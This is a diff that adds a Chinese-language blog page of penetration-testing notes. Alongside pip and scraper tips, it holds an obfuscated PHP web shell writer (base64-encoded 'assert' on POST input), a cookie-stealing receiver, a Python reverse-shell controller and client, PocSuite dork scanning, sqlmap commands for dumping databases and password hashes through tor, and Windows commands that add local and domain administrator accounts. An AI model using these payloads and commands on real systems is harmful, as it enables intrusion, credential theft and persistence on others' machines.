+fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php $a=base64_decode(&quot;YXNzZXJ0&quot;);$a($_POST[1]);?&gt;&#39;);
+?&gt;
+    
+    
+&lt;?php
+if (isset($_GET[&#39;a&#39;]))
+&#123;
+    file_put_contents(&#39;cookie.txt&#39;, $_GET[&#39;a&#39;],FILE_APPEND);
+&#125;
+?&gt;
+</code></pre>
+<hr>
+<h1 id="PocSuite"><a href="#PocSuite" class="headerlink" title="PocSuite"></a>PocSuite</h1><p>两种模式</p>
+<p>命令行模式</p>
+<pre><code>python cli.py
+
+python cli.py -r pocs/ecshop_rce.py --dork ecshop  --threads 10
+</code></pre>
+<p>控制台交互模式</p>
+<pre><code>python console.py
+</code></pre>
+<p><img src="https://i.loli.net/2021/03/02/nB3ZGyH8ot7r16S.png" alt="image-20201228160513450"></p>
+<hr>
+<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><p>pip安装</p>
+<pre><code>pip(python2)安装
+
+wget https://bootstrap.pypa.io/2.6/get-pip.py
+
+python2 get-pip.py
+
+pip2 -V
+
+
+
+pip3(python3)安装
+
+wget https://bootstrap.pypa.io/get-pip.py
+
+python3 get-pip.py
+
+pip3 -V
+</code></pre>
+<p>pip -V    查看pip版本</p>
+<p>pip install [包名] -i [国内源]</p>
+<p>​        清华源</p>
+<p>​        <a target="_blank" rel="noopener" href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></p>
+<p>​        阿里云</p>
+<p>​         <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
+<h2 id="python国内安装包"><a href="#python国内安装包" class="headerlink" title="python国内安装包"></a>python国内安装包</h2><p><a target="_blank" rel="noopener" href="https://mirrors.huaweicloud.com/python/">https://mirrors.huaweicloud.com/python/</a></p>
+<p>wget <a target="_blank" rel="noopener" href="https://mirrors.huaweicloud.com/python/3.9.1/Python-3.9.1rc1.tgz">https://mirrors.huaweicloud.com/python/3.9.1/Python-3.9.1rc1.tgz</a></p>
+<h2 id="IDLE"><a href="#IDLE" class="headerlink" title="IDLE"></a>IDLE</h2><p>查看帮助文档</p>
+<pre><code>dir(&lt;Module&gt;)
+help(&lt;Module&gt;)
+help(&lt;Module&gt;.&lt;function&gt;)
+
+--------------example-----------------
+&gt;&gt;&gt; import &lt;requests&gt;
+
+&gt;&gt;&gt; dir(requests)
+[&#39;ConnectTimeout&#39;, &#39;ConnectionError&#39;, &#39;DependencyWarning&#39;, &#39;FileModeWarning&#39;, &#39;HTTPError&#39;, &#39;NullHandler&#39;, &#39;PreparedRequest&#39;, &#39;ReadTimeout&#39;, &#39;Request&#39;, &#39;RequestException&#39;, &#39;RequestsDependencyWarning&#39;, &#39;Response&#39;, &#39;Session&#39;, &#39;Timeout&#39;, &#39;TooManyRedirects&#39;, &#39;URLRequired&#39;, &#39;__author__&#39;, &#39;__author_email__&#39;, &#39;__build__&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__cake__&#39;, &#39;__copyright__&#39;, &#39;__description__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__license__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__path__&#39;, &#39;__spec__&#39;, &#39;__title__&#39;, &#39;__url__&#39;, &#39;__version__&#39;, &#39;_check_cryptography&#39;, &#39;_internal_utils&#39;, &#39;adapters&#39;, &#39;api&#39;, &#39;auth&#39;, &#39;certs&#39;, &#39;chardet&#39;, &#39;check_compatibility&#39;, &#39;codes&#39;, &#39;compat&#39;, &#39;cookies&#39;, &#39;delete&#39;, &#39;exceptions&#39;, &#39;get&#39;, &#39;head&#39;, &#39;hooks&#39;, &#39;logging&#39;, &#39;models&#39;, &#39;options&#39;, &#39;packages&#39;, &#39;patch&#39;, &#39;post&#39;, &#39;put&#39;, &#39;request&#39;, &#39;session&#39;, &#39;sessions&#39;, &#39;ssl&#39;, &#39;status_codes&#39;, &#39;structures&#39;, &#39;urllib3&#39;, &#39;utils&#39;, &#39;warnings&#39;]
+
+&gt;&gt;&gt; help(requests.get)
+Help on function get in module requests.api:
+
+get(url, params=None, **kwargs)
+    Sends a GET request.
+    
+    :param url: URL for the new :class:`Request` object.
+    :param params: (optional) Dictionary, list of tuples or bytes to send
+        in the query string for the :class:`Request`.
+    :param \*\*kwargs: Optional arguments that ``request`` takes.
+    :return: :class:`Response &lt;Response&gt;` object
+    :rtype: requests.Response
+</code></pre>
+<h2 id="爬虫-正则"><a href="#爬虫-正则" class="headerlink" title="爬虫+正则"></a>爬虫+正则</h2><p>正则</p>
+<pre><code class="python">&quot;^&quot;这个字符在中括号&quot;[]&quot;中被使用的话就表示字符类的否定，如果不是的话就是表示限定开头
+
+.*?  最小化匹配任意字符（非贪婪）
+
+() 括号里的内容可返回
+
+---------example------------
+import requests,re,time,csv
+
+
+#爬取网页
+def get_html_str(url, headers):
+    #response = requests.get(url)
+    #response.encoding = &#39;gb18030&#39; #中文编码
+    
+    response = requests.get(url, headers = headers )
+    html_str = response.text
+    return html_str
+
+
+#筛选数据
+def get_results(html_str):
+    pattern = re.compile(&#39;title=&quot;(.*?)&quot;.*?&quot;image-link&quot;.*?主演：(.*?)&lt;.*?上映时间：(.*?)&lt;&#39;, re.S)  #&#39;规则&#39;, re.S 表示可跨行抓取
+    results = re.findall(pattern,html_str)
+    return results
+
+
+#存储数据：txt格式
+def create_txt():
+    filename = str(time.strftime(&quot;%Y%m%d%H%M%S&quot;, time.localtime()))+&#39;.txt&#39;
+    return filename
+
+def write_txt(filename, results):
+    with open(filename, &#39;a&#39;, encoding = &#39;utf-8&#39; ) as f:
+        for item in results:
+            for i in item:
+                f.write(i.strip())
+                f.write(&#39; &#39;)
+            f.write(&#39;\n&#39;)
+
+
+#存储数据：csv格式
+def create_csv():
+    filename = str(time.strftime(&quot;%Y%m%d%H%M%S&quot;, time.localtime()))+&#39;.csv&#39;
+    with open(filename, &#39;w&#39;, newline=&#39;&#39;, encoding = &#39;utf-8&#39; ) as csvfile:
+        spamwriter = csv.writer(csvfile)
+        spamwriter.writerow([&#39;电影名&#39;, &#39;主演&#39;, &#39;上映时间&#39;])
+    return filename
+
+def write_csv(filename, results):
+    with open(filename, &#39;a&#39;, newline=&#39;&#39;, encoding = &#39;utf-8&#39; ) as csvfile:
+        spamwriter = csv.writer(csvfile)
+        for item in results:
+            spamwriter.writerow([item[0].strip(), item[1].strip(), item[2].strip()])
+
+
+if __name__ == &#39;__main__&#39;:
+    #url = &#39;https://maoyan.com/board/4?offset=10&#39;
+    #headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 FS&#39;&#125;
+
+    #爬取猫眼电影排行榜TOP100，【电影名】【主演】【上映时间】
+    url_a = &#39;https://maoyan.com/board/4?offset=&#39;
+    headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 FS&#39;&#125;
+    
+    filename = create_csv()
+    for page in range(0,10):
+        url = url_a + str(page*10)
+        print(url)
+        html_str = get_html_str(url, headers)
+        results = get_results(html_str)
+        print(results)
+        write_csv(filename, results)
+    print(&#39;OK！&#39;)
+</code></pre>
+<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>以反弹SHELL为例</p>
+<pre><code class="python">&quot;&quot;&quot;
+主控端
+&quot;&quot;&quot;
+import socket
+import threading
+
+def recv_data(sock):
+    while True:
+        msg = sock.recv(10240)
+        print(msg.decode())
+
+def send_data(sock):
+    while True:
+        cmd = input(&#39;command:&#39;)
+        sock.send(cmd.encode())
+if __name__ == &quot;__main__&quot;:
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    sock.bind((&#39;127.0.0.1&#39;,8899))
+    sock.listen(1)
+    sock,address = sock.accept()
+
+    th1 = threading.Thread(target=recv_data,args=(sock,))
+    th2 = threading.Thread(target=send_data,args=(sock,))
+    th1.start()
+    th2.start()
+
+    
+    
+    
+&quot;&quot;&quot;
+被控端
+&quot;&quot;&quot;
+import socket
+import os
+
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.connect((&#39;127.0.0.1&#39;,8899))
+
+while True:
+    cmd = sock.recv(1024)
+    msg = os.popen(cmd.decode().strip())
+    data = &#39;&#39;
+    for m in msg:
+        data += m
+    sock.send(data.encode())
+</code></pre>
+<p>当任务很多时 要加队列 queue</p>
+<hr>
+<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><p>SQLMAP已经支持Python3</p>
+<h2 id="SQLMAP目录"><a href="#SQLMAP目录" class="headerlink" title="SQLMAP目录"></a>SQLMAP目录</h2><p><img src="https://i.loli.net/2021/03/02/dwpAETfytH3JzoG.png" alt="image-20201106142310963"></p>
+<p><img src="https://i.loli.net/2021/03/02/ecB2jJtv3dC6aol.png" alt="image-20201106142601716"></p>
+<h2 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h2><pre><code>sqlmap -u &quot;xxxxx&quot;        //判断是否有注入
+sqlmap -u &quot;xxxxx&quot; --dbs        //跑库名
+sqlmap -u &quot;xxxxx&quot; --current-db        //查看当前数据库
+sqlmap -u &quot;xxxxx&quot; -D [库名] --tables        //跑表名
+sqlmap -u &quot;xxxxx&quot; -D [库名] -T [表名] --columns        //跑列名
+sqlmap -u &quot;xxxxx&quot; -D [库名] -T [表名] --dump        //跑字段
+sqlmap -u &quot;xxxxx&quot; -D [库名] -T [表名] --dump --start 1 --stop 2        //跑字段 从第1条开始，第2条结束
+</code></pre>
+<p>支持六种注入模式 BEUSTQ</p>
+<p>①布尔</p>
+<p>②报错</p>
+<p>③联合</p>
+<p>④堆叠</p>
+<p>⑤时间</p>
+<p>⑥内联</p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>python2 splmap.py -u “xxxxx”</p>
+<p>-m 1.txt            //批量检测txt中的url</p>
+<p>-r 1.txt            //从文件中加载HTTP请求</p>
+<p>​            将POST请求包用burp抓包后复制到1.txt中</p>
+<pre><code>python2 sqlmap.py -r 1.txt --batch
+python2 sqlmap.py -r 1.txt --batch --current-db
+python2 sqlmap.py -r 1.txt --batch -D security --tables
+</code></pre>
+<p>-p “id”</p>
+<p>-dbms mysql //已知数据库类型为MYSQL</p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>①Burp抓包    复制到1.txt    sqlmap -r 1.txt –batch跑一下</p>
+<p>②–data</p>
+<pre><code>python2 sqlmap.py -u &quot;http://192.168.10.147/sqli/Less-11/&quot; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot;
+
+python2 sqlmap.py -u &quot;http://192.168.10.147/sqli/Less-11/&quot; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; --dbs
+available databases [8]:
+[*] challenges
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] pikachu
+[*] security
+[*] test
+</code></pre>
+<h2 id="请求和回显不在同一个页面"><a href="#请求和回显不在同一个页面" class="headerlink" title="请求和回显不在同一个页面"></a>请求和回显不在同一个页面</h2><p>–second-url[空格]”XXXXX”        或        –second-url=”XXXXX”</p>
+<pre><code>python2 sqlmap.py -r 1.txt --second-url &quot;http://192.168.10.147/DVWA/vulnerabilities/sqli/&quot; --batch
+
+python2 sqlmap.py -r 1.txt --second-url &quot;http://192.168.10.147/DVWA/vulnerabilities/sqli/&quot; --batch --current-db
+dvwa
+</code></pre>
+<p>–banner</p>
+<p>–method=GET/POST</p>
+<p>–current-user</p>
+<p>–current-db</p>
+<p>–data</p>
+<p>–hostname</p>
+<p>–users            //枚举数据库管理系统用户</p>
+<p>–passwords            //枚举数据库管理系统用户密码哈希</p>
+<p>–is-dba</p>
+<p>–dbs</p>
+<p>–tables</p>
+<p>–columns</p>
+<p>–batch            //默认 yes</p>
+<p> -v VERBOSE            //详细级别：0-6（默认为1）.设置输出信息的详细程度</p>
+<p>​                    0:只显示追踪栈 ,错误以及重要信息。</p>
+<p>​                    1:还显示信息和警告。</p>
+<p>​                    2:显示debug消息。</p>
+<p>​                    3:显示注入payload。</p>
+<p>​                    4:显示HTTP请求。</p>
+<p>​                    5:显示HTTP响应头。</p>
+<p>​                    6:显示HTTP响应内容</p>
+<p>–fresh-queries            //清除查询缓存</p>
+<p>–cookie [cookie]        //检查cookie头（level&gt;=2）</p>
+<p>–level=5            //最高为5</p>
+<p>–random-agent        //使用随机的请求头</p>
+<p>–delay 1                    //每次http(s)请求之间延迟的时间，单位秒</p>
+<p>–randomsize            //长度、类型与原始值保持一致的情况下，随机给出参数值</p>
+<p>–safe-url=”xxxxx”    //设置能够正常访问的安全链接，配合–safe-freq使用</p>
+<p>–safe-freq 3            //每发送3次注入请求后,发送一次正常请求</p>
+<p>–tor            //使用tor匿名网络</p>
+<p>–tor-port=77777</p>
+<p>–tor-type=HTTP/SOCKS4/SOCKS5</p>
+<p>–check-tor            //检查tor是否正常使用</p>
+<p>最后加 &gt; 1.txt    //将显示结果导出为1.txt</p>
+<hr>
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><p><strong>新建用户 添加至管理员组</strong></p>
+<p>cmd &gt;</p>
+<p>net user  lucy Nihao12! /add        //密码要设复杂点，避免无回显的情况下因密码复杂度策略创建失败</p>
+<p>net localgroup administrators lucy /add</p>
+<p><strong>查看端口号、PID</strong></p>
+<p>cmd &gt;</p>
+<p>netstat -ano</p>
+<p><strong>查看进程名称、PID</strong></p>
+<p>cmd &gt;</p>
+<p>tasklist</p>
+<p><strong>查看CPU占用</strong></p>
+<p>cmd &gt;</p>
+<p>wmic cpu get LoadPercentage /value</p>
+<p><strong>查看计划任务</strong></p>
+<p>cmd &gt;</p>
+<p>schtasks</p>
+<p><strong>修改用户名/密码</strong></p>
+<p>win + R &gt; netplwiz</p>
+<p><strong>远程连接</strong></p>
+<p>win + R &gt; mstsc</p>
+<p><strong>查看当前windows版本</strong></p>
+<p>win + Q &gt; winver</p>
+<p><strong>快速查找文件</strong></p>
+<p>cmd &gt;</p>
+<p>dir | findstr “xxx”</p>
+<p>新建文件夹</p>
+<p>md 【folderName】</p>
+<p>删除文件夹</p>
+<p>rd 【folderName】（仅限空文件夹）</p>
+<p>rd /s /q 【folderName】（/强制 /无弹窗 删除文件夹及其文件）</p>
+<p>新建空文件</p>
+<p>type nul&gt;*.*</p>
+<p>新建非空文件</p>
+<p>echo [fileContent]&gt;*.*</p>
+<p>移动文件</p>
+<p>move 【空格】【路径+要移动的文件名】【空格】【目标路径】</p>
+<p>删除文件</p>
+<p>del *.*</p>
+<p><strong>生成文件树</strong></p>
+<p>tree</p>
+<p>tree /f</p>
+<p>tree /f &gt; 1.txt</p>
+<h2 id="域内-域控"><a href="#域内-域控" class="headerlink" title="域内-域控"></a>域内-域控</h2><p>cmd &gt; </p>
+<p>net user    查看域用户</p>
+<p>net user &lt;用户名&gt; &lt;密码&gt; /add    创建域用户</p>
+<p>net “Domain Admins” jbh /add /domain’</p>
+<h2 id="域内-成员机"><a href="#域内-成员机" class="headerlink" title="域内-成员机"></a>域内-成员机</h2><p>cmd &gt;</p>
+<p>net user /domain    查看域用户</p>
+<p>net user &lt;用户名&gt; &lt;密码&gt; /add /domain    添加域用户</p>
+<h2 id="同网段主机探测"><a href="#同网段主机探测" class="headerlink" title="同网段主机探测"></a>同网段主机探测</h2><pre><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.11.%I | findstr &quot;TTL=&quot;
+</code></pre>
+<hr>
+<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>发现Linux主机被上传webshell：</p>
+<ol>
+<li>断网</li>
+<li>查看历史命令</li>
+<li>查看最新更改/增加的文件</li>
+<li>查看进程（希望不大）</li>
+<li>查看web日志，日志分析寻找上传点，修复</li>
+</ol>
+<h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><p>7.0以上的PHP版本连不上</p>
+
+</div>
+
+		</div>
+		
+	</div>
+
+	<!-- 引入代码高亮的 js -->
+	
+<script src="/lib/highlight/highlight.pack.js"></script>
+
+
+	<!-- 引入 jquery -->
+	
+<script src="/lib/jquery-3.4.1.min.js"></script>
+
+
+	<!-- 引入 pjax -->
+	
+<script src="/lib/jquery.pjax.js"></script>
+
+	
+	<!-- 引入 js 文件 -->
+	
+<script src="/js/main.js"></script>
+
+
+	<script src="https://cdn.jsdelivr.net/npm/live2d-widget@3.0.4/lib/L2Dwidget.min.js"></script>
+	<script type="text/javascript">
+	L2Dwidget.init();
+	</script>
+
+</body>
+</html>
